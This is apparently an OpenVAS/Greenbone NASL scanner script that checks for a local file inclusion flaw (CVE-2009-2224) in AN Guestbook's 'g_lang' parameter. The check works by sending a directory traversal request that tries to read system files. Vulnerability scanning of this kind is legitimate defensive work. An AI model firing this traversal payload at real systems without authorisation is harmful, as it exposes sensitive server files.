# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:an_guestbook:an_guestbook";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800526");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-07-07 11:58:41 +0200 (Tue, 07 Jul 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-2224");
  script_name("AN Guestbook Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_an_guestbook_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("AN-Guestbook/detected");

  script_tag(name:"affected", value:"AN Guestbook version 0.7 to 0.7.8");

  script_tag(name:"insight", value:"The flaw is due to error in 'g_lang' parameter in 'ang/shared/flags.php' which
  is not properly verified before being used to include files.");

  script_tag(name:"solution", value:"Upgrade to AN Guestbook version 1.2.1 or later.");

  script_tag(name:"summary", value:"AN Guestbook is prone to Local File Inclusion vulnerability.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to include and execute arbitrary
  files from local and external resources, and can gain sensitive information
  about remote system directories when register_globals is enabled.");

  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9013");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35486");
  script_xref(name:"URL", value:"http://en.securitylab.ru/nvd/381881.php");
  script_xref(name:"URL", value:"http://www.attrition.org/pipermail/vim/2009-June/002196.html");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + "/ang/shared/flags.php?g_lang=../../../../../../../" + file;
  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 );
